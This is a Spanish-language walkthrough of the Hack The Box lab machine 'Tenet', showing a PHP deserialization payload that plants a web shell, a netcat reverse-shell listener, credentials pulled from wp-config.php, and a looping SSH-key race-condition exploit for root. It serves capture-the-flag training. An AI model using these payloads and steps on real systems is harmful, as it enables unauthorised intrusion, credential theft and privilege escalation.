---
layout: single
title: Tenet - Hack The Box
excerpt: "En este post vamos a resolver la maquina Tenet de la plataforma de Hackthebox donde mediante un wordpress nos daremos cuenta que un usuario nos da informacion sobre una ruta en php la cual podremos ver su contenido y haremos un PHP Deserealization Attack para poder enviarnos una reverse shell a nuestra maquina de atacante para la escalada de privilegios estaremos abusando de un Race Condition para conectarnos como root por SSH sin proporcionar contraseña"
date: 2023-07-26
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-tenet/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - PHP Deserialization Attack
  - Abusing Race Condition
---

<p align="center">
<img src="/assets/images/htb-writeup-tenet/banner.png">
</p>

```bash
❯ ping -c 1 10.129.87.27
PING 10.129.87.27 (10.129.87.27) 56(84) bytes of data.
64 bytes from 10.129.87.27: icmp_seq=1 ttl=63 time=151 ms

--- 10.129.87.27 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 151.004/151.004/151.004/0.000 ms
❯ whichSystem.py 10.129.87.27

10.129.87.27 (ttl -> 63): Linux
```

## PortScan

```bash
❯ nmap -sCV -p22,80 10.129.87.27 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-25 19:44 CST
Nmap scan report for 10.129.87.27
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ccca43d44ce74ebf26f427eab875a8f8 (RSA)
|   256 85f3acba1a6a0359e27e8647e73e3c00 (ECDSA)
|_  256 e7e99addc34a2f7ae1e05da2b0ca44a8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que se esta usando un **Wordpress** como gestor de contenido 

```bash
❯ nmap --script=http-enum -p80 10.129.87.27 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-25 19:44 CST
Nmap scan report for 10.129.87.27
Host is up (0.15s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /wordpress/wp-login.php: Wordpress login page.
```

## Enumeracion

Vemos las tecnologías que se están usando en el servicio web 

```ruby
❯ whatweb http://10.129.87.27
http://10.129.87.27 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.129.87.27], Title[Apache2 Ubuntu Default Page: It works]
```

Si vamos a ver la pagina web como tal encontramos esto 

![](/assets/images/htb-writeup-tenet/web1.png)

Pero si vamos a ala ruta que nos reporto `Nmap` podemos ver el **Wordpress**

![](/assets/images/htb-writeup-tenet/web2.png)

Lo vemos de esa forma ya que como tal si vemos el código fuente vemos que los recursos están cargando del subdominio `tenet.htb`

![](/assets/images/htb-writeup-tenet/web3.png)

Así que lo que vamos a hacer es agregarlo al `/etc/hosts` para que los recursos se muestren de manera correcta

```bash
❯ echo "10.129.87.27 tenet.htb" | sudo tee -a /etc/hosts
10.129.87.27 tenet.htb
```

Ahora si funciona

![](/assets/images/htb-writeup-tenet/web4.png)

Como podemos ver en la imagen pasada tenemos la versión que se esta empleando en el **wordpress** pero bueno si buscamos vulnerabilidades como tal de momento no sabemos si pueden funcionar

```bash
❯ searchsploit wordpress 5.6
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin 1 Flash Gallery 1.30 < 1.5.7a - Arbitrary File Upload (Metasploit)           | php/webapps/17801.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                           | php/webapps/39553.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                     | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                   | php/webapps/48918.sh
WordPress Plugin Social Slider 5.6.5 - SQL Injection                                          | php/webapps/17617.txt
WordPress Plugin Soliloquy Lite 2.5.6 - Persistent Cross-Site Scripting                       | php/webapps/47517.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Vamos a hacer **Fuzzing** para ver si encontramos alguna ruta interesante

```bash
❯ gobuster dir -u http://tenet.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 --no-error -x php -s 200
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://tenet.htb/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/07/25 19:56:01 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 301) [Size: 0] [--> http://tenet.htb/]
/wp-content           (Status: 301) [Size: 311] [--> http://tenet.htb/wp-content/]
/wp-login.php         (Status: 200) [Size: 6534]                                  
/wp-includes          (Status: 301) [Size: 312] [--> http://tenet.htb/wp-includes/]
/wp-trackback.php     (Status: 200) [Size: 135]                                    
/wp-admin             (Status: 301) [Size: 309] [--> http://tenet.htb/wp-admin/]   
/xmlrpc.php           (Status: 405) [Size: 42]                                     
/wp-signup.php        (Status: 302) [Size: 0] [--> http://tenet.htb/wp-login.php?action=register]
/server-status        (Status: 403) [Size: 274]                                                  
                                                                                                 
===============================================================
2023/07/25 20:07:30 Finished
===============================================================
```

Y bueno como tal la mayoría de rutas nos dan un código de estado diferente a **301** así que vamos a ver los códigos de estado **200**

Vemos el panel de login 

![](/assets/images/htb-writeup-tenet/web5.png)

Y bueno aquí ya encontramos algo interesante

![](/assets/images/htb-writeup-tenet/web6.png)

Bueno puede ser una pista pero de momento no tenemos nada interesante algo que podemos hacer también es aplicar **Fuzzing** para ver si hay mas subdominios

```bash
❯ gobuster vhost -u http://tenet.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 --no-error
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://tenet.htb
[+] Method:       GET
[+] Threads:      50
[+] Wordlist:     /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/07/25 20:20:50 Starting gobuster in VHOST enumeration mode
===============================================================
Found: www.tenet.htb (Status: 301) [Size: 0]
```

Lo agregamos al `/etc/hosts`

```bash
❯ cat /etc/hosts | tail -n 1
10.129.87.27 tenet.htb www.tenet.htb
```

Pero nos redirige al subdominio que ya teníamos

![](/assets/images/htb-writeup-tenet/web7.png)

Si analizamos un **post** de los que hay en la web hay una el cual se llama **Migration** y si lo analizamos vemos que hay un comentario del usuario **neil**

![](/assets/images/htb-writeup-tenet/web8.png)

Hay una ruta que se llama `sator.php`

```bash
❯ curl -s http://tenet.htb/sator.php
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at tenet.htb Port 80</address>
</body></html>
```

Si probamos poniendo la `ip` vemos que cambia la cosa

```bash
❯ curl -s http://10.129.87.27/sator.php
[+] Grabbing users from text file <br>
[] Database updated <br>
```

Algo que mencionaban en los comentarios era sobre un `backup` así que si agregamos ala ruta que tenemos `.bak` vemos que como tal existe

```bash
❯ curl -s http://10.129.87.27/sator.php.bak
<?php

class DatabaseExport
{
	public $user_file = 'users.txt';
	public $data = '';

	public function update_db()
	{
		echo '[+] Grabbing users from text file <br>';
		$this-> data = 'Success';
	}


	public function __destruct()
	{
		file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
		echo '[] Database updated <br>';
	//	echo 'Gotta get this working properly...';
	}
}

$input = $_GET['arepo'] ?? '';
$databaseupdate = unserialize($input);

$app = new DatabaseExport;
$app -> update_db();


?>
```

![](/assets/images/htb-writeup-tenet/web9.png)

## Shell as www-data

# PHP Deserialization Attack

![](/assets/images/htb-writeup-tenet/web10.png)

Bueno como tal nos están dejando controlar nuestro `input` que se tramita por **GET** y como tal no esta aplicando sanitizacion y como tal esta empleando el parámetro `arepo` vamos a crear una data serealizada

Vamos a crear un **script en php** para que nos de la data `serializada` ya que mediante el parámetro `cmd` vamos a ejecutar comandos

```bash
❯ catn serialize.php
<?php
class DatabaseExport
{
        public $user_file = 'xd.php';
        public $data = '<?php system($_REQUEST["cmd"]); ?>';
}

$pwned = new DatabaseExport;
echo serialize($pwned);
?>
```

Si lo ejecutamos nos da el objeto `serealizado`

```bash
❯ php serialize.php 2>/dev/null; echo
O:14:"DatabaseExport":2:{s:9:"user_file";s:6:"xd.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}
```

Vamos enviarle toda la data mediante el parámetro `arepo` el cual no esta sanitizado y nos interpretara lo que le pasemos ya que se va a deserealizar

```bash
┌─[root@parrot]─[/home/miguel7/Hackthebox/Tenet/content]
└──╼ #curl -s -X GET -G "http://10.129.87.27/sator.php" --data-urlencode 'arepo=O:14:"DatabaseExport":2:{s:9:"user_file";s:6:"xd.php";s:4:"data";s:34:"<?php system($_REQUEST["cmd"]); ?>";}'; echo
[+] Grabbing users from text file <br>
[] Database updated <br>[] Database updated <br>
```

Vemos que el archivo `xd.php` que definimos en el `script` se creo correctamente

![](/assets/images/htb-writeup-tenet/web11.png)

Y ya podemos ejecutar comandos

![](/assets/images/htb-writeup-tenet/web12.png)

Ahora ganamos acceso al sistema enviándonos una `reverse shell`

![](/assets/images/htb-writeup-tenet/web13.png)

Ahora recibimos la shell 

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.87.27 60714
bash: cannot set terminal process group (1926): Inappropriate ioctl for device
bash: no job control in this shell
www-data@tenet:/var/www/html$ whoami
whoami
www-data
www-data@tenet:/var/www/html$ 
```

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.87.27 60714
bash: cannot set terminal process group (1926): Inappropriate ioctl for device
bash: no job control in this shell
www-data@tenet:/var/www/html$ whoami
whoami
www-data
www-data@tenet:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@tenet:/var/www/html$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
www-data@tenet:/var/www/html$ export TERM=xterm
```

## neil shell 

Encontramos credenciales

```bash
www-data@tenet:/var/www/html/wordpress$ ls -la
total 228
drwxr-xr-x  5 www-data www-data  4096 Jul 26 01:45 .
drwxr-xr-x  3 www-data www-data  4096 Jul 26 03:06 ..
-rw-r--r--  1 www-data www-data   405 Feb  6  2020 index.php
-rw-r--r--  1 www-data www-data 19915 Feb 12  2020 license.txt
-rw-r--r--  1 www-data www-data  7278 Jun 26  2020 readme.html
-rw-r--r--  1 www-data www-data  7101 Jul 28  2020 wp-activate.php
drwxr-xr-x  9 www-data www-data  4096 Dec  8  2020 wp-admin
-rw-r--r--  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
-rw-r--r--  1 www-data www-data  2328 Oct  8  2020 wp-comments-post.php
-rw-r--r--  1 www-data www-data  2913 Feb  6  2020 wp-config-sample.php
-rw-r--r--  1 www-data www-data  3185 Jan  7  2021 wp-config.php
drwxr-xr-x  5 www-data www-data  4096 Jul 26 01:45 wp-content
-rw-r--r--  1 www-data www-data  3939 Jul 30  2020 wp-cron.php
drwxr-xr-x 25 www-data www-data 12288 Dec  8  2020 wp-includes
-rw-r--r--  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php
-rw-r--r--  1 www-data www-data  3300 Feb  6  2020 wp-load.php
-rw-r--r--  1 www-data www-data 49831 Nov  9  2020 wp-login.php
-rw-r--r--  1 www-data www-data  8509 Apr 14  2020 wp-mail.php
-rw-r--r--  1 www-data www-data 20975 Nov 12  2020 wp-settings.php
-rw-r--r--  1 www-data www-data 31337 Sep 30  2020 wp-signup.php
-rw-r--r--  1 www-data www-data  4747 Oct  8  2020 wp-trackback.php
-rw-r--r--  1 www-data www-data  3236 Jun  8  2020 xmlrpc.php
www-data@tenet:/var/www/html/wordpress$ cat wp-config.php 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'neil' );

/** MySQL database password */
define( 'DB_PASSWORD', 'Opera2112' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define( 'WP_HOME', 'http://tenet.htb');
define( 'WP_SITEURL', 'http://tenet.htb');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'QiuK;~(mBy7H3y8G;*|^*vGekSuuxKV$:Tc>5qKr`T}(t?+`r.+`gg,Ul,=!xy6d' );
define( 'SECURE_AUTH_KEY',  'x3q&hwYy]:S{l;jDU0D&./@]GbBz(P~}]y=3deqO1ZB/`P:GU<tJ[v)4><}wl_~N' );
define( 'LOGGED_IN_KEY',    'JrJ_u34gQ3(x7y_Db8`9%@jq<;{aqQk(Z+uZ|}M,l?6.~Fo/~Tr{0bJIW?@.*|Nu' );
define( 'NONCE_KEY',        '=z0ODLKO{9K;<,<gT[f!y_*1QgIc;#FoN}pvHNP`|hi/;cwK=vCwcC~nz&0:ajW#' );
define( 'AUTH_SALT',        '*.;XACYRMNvA?.r)f~}+A,eMke?/i^O6j$vhZA<E5Vp#N[a{YL TY^-Q[X++u@Ab' );
define( 'SECURE_AUTH_SALT', 'NtFPN?_NXFqW-Bm6Jv,v-KkjS^8Hz@BIcxc] F}(=v1$B@F/j(`b`7{A$T{DG|;h' );
define( 'LOGGED_IN_SALT',   'd14m0mBP eIawFxLs@+CrJz#d(88cx4||<6~_U3F=aCCiyN|]Hr{(mC5< R57zmn' );
define( 'NONCE_SALT',       'Srtt&}(~:K(R(q(FMK<}}%Zes!4%!S`V!KSk)Rlq{>Y?f&b`&NW[INM2,a9Zm,SH' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

www-data@tenet:/var/www/html/wordpress$ 
```

Las credenciales son para la base de datos pero como tal si probamos para migrar al usuario `neil` vemos que funcionan `Opera2112`

```bash
www-data@tenet:/var/www/html/wordpress$ su neil
Password: 
neil@tenet:/var/www/html/wordpress$ whoami
neil
neil@tenet:/var/www/html/wordpress$ id
uid=1001(neil) gid=1001(neil) groups=1001(neil)
neil@tenet:/var/www/html/wordpress$ 
```

## User.txt 

Aquí podemos ver la primer flag

```bash
neil@tenet:~$ cat user.txt 
1d357ac704b152e9b76badf0b10d0a10
neil@tenet:~$ 
```

## Escalada de privilegios

Tenemos este privilegio a nivel de `sudoers`

```bash
neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
neil@tenet:~$ 
```

Si lo ejecutamos vemos esto 

```bash
neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
Successfully added root@ubuntu to authorized_keys file!
neil@tenet:~$ 
```

Vemos esto 

```bash
neil@tenet:~$ cat /usr/local/bin/enableSSH.sh
#!/bin/bash

checkAdded() {

	sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)

	if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then

		/bin/echo "Successfully added $sshName to authorized_keys file!"

	else

		/bin/echo "Error in adding $sshName to authorized_keys file!"

	fi

}

checkFile() {

	if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then

		/bin/echo "Error in creating key file!"

		if [[ -f $1 ]]; then /bin/rm $1; fi

		exit 1

	fi

}

addKey() {

	tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)

	(umask 110; touch $tmpName)

	/bin/echo $key >>$tmpName

	checkFile $tmpName

	/bin/cat $tmpName >>/root/.ssh/authorized_keys

	/bin/rm $tmpName

}

key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
addKey
checkAdded
neil@tenet:~$ 
```

![](/assets/images/htb-writeup-tenet/web14.png)

![](/assets/images/htb-writeup-tenet/web15.png)

Si vemos el script y ejecutamos esto que almacena `tmpName` crea un valor temporal

```bash
neil@tenet:~$ mktemp -u /tmp/ssh-XXXXXXXX
/tmp/ssh-ui1c8x0m
neil@tenet:~$ mktemp -u /tmp/ssh-XXXXXXXX
/tmp/ssh-KH7vkHSO
```

Lo primero que vamos a hacer es crear un par de claves

```bash
❯ ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:d8Pcfbhcw4RyOAqz6QaDktvBmF00NF1OnPu+93GIHUI root@parrot
The key's randomart image is:
+---[RSA 3072]----+
|    .=. oo.      |
|    . o.oo  . .  |
|     . o ..+Eo . |
|  * o   =..++.oo |
| = = o oS.o * +o+|
|  + . +  . o * =o|
| . .   o  . . =..|
|      .    . .  o|
|           .o .. |
+----[SHA256]-----+
```

Ahora la copiamos

```bash
❯ cat id_rsa.pub | tr -d '\n' | xclip -sel clip
```

Y ejecutamos un bucle con nuestra clave publica

```bash
neil@tenet:~$ while true; do for filename in /tmp/ssh-*; do echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyrug7ycuU3H1lx82B0D6jDxi9LKGRNuW12RvvSp3+oOW1pAK+C24CIgvT6mgEJn5oCWmOhnZ17wRmUFVEg6OQy3hlGCI/Nu6MA1FDCGaRiUoO+nxnnUfR0INFWWXjCmD+Lg4Tf3Kepe9IXmUTLsgM7z9dUbW8PxhIcy2rexJ0lmkoSOuBXdxMSOydNTteSmvRf3HBFE9Ui2tIFJyBZwHQPWfdbrJY3acyV5jXvO1T75h4NBYjVrXzaoml5eEJ01kqdl22CEskiZFgHkDWMl22tRO6eqzX6ZkhMDTwVqMQI9n2bveLsWVoEjbMtXZVIDcMiWDnYDSkhtKMhyJOQUICQy3L1yeuLKfj0/fXwWn3sjYFMgWFH8MAsZSGEP90k1zPwOiE1Bb4nEvce+wBI8MDlHVtTMcW1sU8h5by/QOvadIJnhyYY+eC5UiEYqoFB1VwMIRWr4unFGX4eSoLtnawolTo54I+LgBvaIb8b/XPiW/NvygC1qj5hCS1dQc= root@parrot" > $filename;done; done
```

Ahora desde otra ventana nos conectamos por **SSH**

```bash
❯ ssh neil@10.129.87.27
The authenticity of host '10.129.87.27 (10.129.87.27)' can't be established.
ECDSA key fingerprint is SHA256:WV3NcHaV7asDFwcTNcPZvBLb3MG6RbhW9hWBQqIDwlE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.87.27' (ECDSA) to the list of known hosts.
neil@10.129.87.27's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul 26 03:58:36 UTC 2023

  System load:  0.83               Processes:             179
  Usage of /:   15.5% of 22.51GB   Users logged in:       0
  Memory usage: 14%                IP address for ens160: 10.129.87.27
  Swap usage:   0%


53 packages can be updated.
31 of these updates are security updates.
To see these additional updates run: apt list --upgradable


Last login: Thu Dec 17 10:59:51 2020 from 10.10.14.3
neil@tenet:~$ sudo -l
Matching Defaults entries for neil on tenet:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

User neil may run the following commands on tenet:
    (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh
neil@tenet:~$ 
```

Y ejecutamos

```bash
neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
```

## Shell as root and root.txt 

Después de varios intentos lo logramos ya que es un `race condition`

```bash
❯ ssh root@10.129.87.27
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul 26 04:43:43 UTC 2023

  System load:  1.93               Processes:             189
  Usage of /:   15.5% of 22.51GB   Users logged in:       1
  Memory usage: 15%                IP address for ens160: 10.129.87.27
  Swap usage:   0%


53 packages can be updated.
31 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Feb 11 14:37:46 2021
root@tenet:~# whoami
root
root@tenet:~#
root@tenet:~# cat root.txt 
b54b692f1f4491fdd5bdbbe61e38bbd6
root@tenet:~# 
```
